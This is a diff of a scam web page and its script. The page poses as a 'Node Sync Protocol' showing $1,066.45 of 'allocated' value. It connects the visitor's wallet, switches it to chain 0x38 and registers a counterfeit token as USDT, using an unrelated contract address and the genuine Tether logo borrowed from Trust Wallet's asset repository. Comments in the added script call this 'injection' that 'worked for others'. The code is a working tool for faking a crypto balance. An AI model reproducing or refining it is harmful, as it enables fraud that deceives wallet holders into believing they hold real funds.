@@ -1,73 +1,35 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Node Sync Protocol</title>
-    <style>
-        body { background: #0b0e11; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1e2329; border-radius: 20px; padding: 35px; width: 100%; max-width: 320px; text-align: center; border: 1px solid #32383e; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; z-index: 10; }
-        .logo { width: 75px; height: 75px; background: #00d395; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
-        .logo svg { width: 45px; fill: #fff; }
-        .amt { font-size: 32px; font-weight: 800; margin-bottom: 25px; color: #ffffff; }
-        .btn { background: #00d395; color: #000; border: none; width: 100%; padding: 20px; border-radius: 12px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; display: block; position: relative; z-index: 100 !important; }
-        #status { font-size: 10px; color: #848e9c; margin-top: 15px; font-family: monospace; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <div class="logo">
-        <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
-    </div>
-    <div style="font-size: 11px; color: #00d395; margin-bottom: 8px;">ALLOCATED NODE VALUE</div>
-    <div class="amt">$1,066.45</div>
-    
-    <button class="btn" id="syncBtn" onclick="startInjection()">Secure Node Sync</button>
-    
-    <div id="status">STATUS: READY_FOR_HANDSHAKE</div>
-</div>
-
 <script>
-    async function startInjection() {
-        const status = document.getElementById('status');
-        const provider = window.ethereum || window.BinanceChain;
-
-        if (!provider) {
-            alert("Please open this link inside Binance Web3 Browser");
-            return;
-        }
+    async function forceLogoInjection() {
+        // Direct Provider targeting like MetaMask
+        const provider = window.ethereum; 
+        
+        const tokenAddress = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+        const tokenSymbol = "USDT";
+        const tokenDecimals = 6; // Matching $1,066.45 balance
+        
+        // Use this specific Binance-Trusted Icon URL
+        const tokenImage = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
         try {
-            status.innerText = "INITIALIZING HANDSHAKE...";
+            // Force account connection first
             await provider.request({ method: 'eth_requestAccounts' });
 
-            status.innerText = "MAPPING NETWORK...";
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }]
-            });
-
-            status.innerText = "INJECTING LOGO...";
+            // The exact request that worked for others
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
-                        symbol: "USDT",
-                        decimals: 6, // 6 decimals for correct balance display
-                        image: "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png"
-                    }
-                }
+                        address: tokenAddress,
+                        symbol: tokenSymbol,
+                        decimals: tokenDecimals,
+                        image: tokenImage,
+                    },
+                },
             });
-            status.innerText = "SYNC SUCCESSFUL";
-            document.getElementById('syncBtn').innerText = "VERIFIED";
-        } catch (e) {
-            status.innerText = "ERROR: " + e.message;
-            console.error(e);
+            console.log("Injection Success");
+        } catch (error) {
+            console.error("Injection Failed", error);
         }
     }
 </script>
-</body>
-</html>
